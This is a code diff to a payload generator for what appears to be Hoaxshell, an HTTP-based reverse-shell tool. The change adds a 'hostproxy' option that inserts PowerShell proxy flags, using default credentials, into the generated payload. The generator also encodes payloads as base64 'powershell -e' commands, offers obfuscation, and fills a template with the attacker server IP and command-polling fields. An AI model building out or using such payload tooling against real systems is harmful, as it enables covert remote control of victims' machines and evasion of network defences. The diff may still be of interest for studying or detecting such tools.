@@ -28,14 +28,13 @@ class Payload_generator:
 		self.boolean_args = {
 			'encode' : False,
 			'obfuscate' : False,		
-			'constraint_mode' : False
+			'constraint_mode' : False,
 		}
 		
 		self.supported = {
 			'linux' : ['domain'],
-			'windows' : ['domain', 'encode', 'obfuscate', 'constraint_mode', 'exec_outfile']
+			'windows' : ['domain', 'encode', 'obfuscate', 'constraint_mode', 'exec_outfile', 'hostproxy']
 		}
-
 
 	def encodeUTF16(self, payload):
 		enc_payload = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
@@ -56,7 +55,6 @@ class Payload_generator:
 					
 				except:
 					args_dict[tmp[0].lower()] = True
-			
 			return args_dict
 		
 		except:
@@ -80,7 +78,7 @@ class Payload_generator:
 			boolean_args = deepcopy(self.boolean_args)
 			args_dict = self.args_to_dict(args_list)
 			arguments = args_dict.keys()
-			
+
 			if not args_dict:
 				print(f'Error parsing arguments. Check your input and try again.')
 				return
@@ -145,11 +143,9 @@ class Payload_generator:
 			else:
 				exec_outfile = False
 
-
-
 			''' Parse DOMAIN '''		
 			if 'domain' in arguments:
-				
+
 				if not Hoaxshell_settings.ssl_support:
 					domain = False
 					print('Hoaxshell server must be started with SSL support to use a domain.')
@@ -168,6 +164,20 @@ class Payload_generator:
 				domain = False
 
 
+			''' Parse HOSTPROXY '''
+			if 'hostproxy' in arguments and 'hostproxy' in self.supported[os_type]:
+
+				if isinstance(args_dict['hostproxy'], str):
+			
+					hostproxy = args_dict['hostproxy']
+					del args_dict['hostproxy']
+
+				else:
+					print("hostproxy must be type str")
+					return
+			else:
+				hostproxy = False
+
 
 			''' Parse BOOLEAN '''			
 			for item in boolean_args.keys():
@@ -178,12 +188,11 @@ class Payload_generator:
 						
 					else:
 						print(f'Ignoring argument "{item}" (not supported for {os_type} payloads)')
-		
 			
 			if (os_type == 'linux'):
 				boolean_args['constraint_mode'] = True
 				boolean_args['trusted_domain'] = False
-			
+
 			
 			# Create session unique id
 			verify = str(uuid4())[0:8]
@@ -213,7 +222,12 @@ class Payload_generator:
 			# Process payload template 
 			payload = payload.replace('*SERVERIP*', lhost).replace('*SESSIONID*', session_unique_id).replace('*FREQ*', str(
 				frequency)).replace('*VERIFY*', verify).replace('*GETCMD*', get_cmd).replace('*POSTRES*', post_res).replace('*HOAXID*', header_id).strip()
-						
+			
+			if hostproxy:
+				payload = payload.replace("*PROXY*", "-Proxy " + hostproxy + " -ProxyUseDefaultCredentials")
+			else:
+				payload = payload.replace("*PROXY*", "")
+
 			if exec_outfile:
 				payload = payload.replace("*OUTFILE*", args_dict['exec_outfile'])
 			
@@ -234,7 +248,7 @@ class Payload_generator:
 				'exec_outfile' : exec_outfile if exec_outfile else False
 			}
 			
-		except:
+		except ValueError:
 			print('Error parsing arguments. Check your input and try again.')
 			return
 		
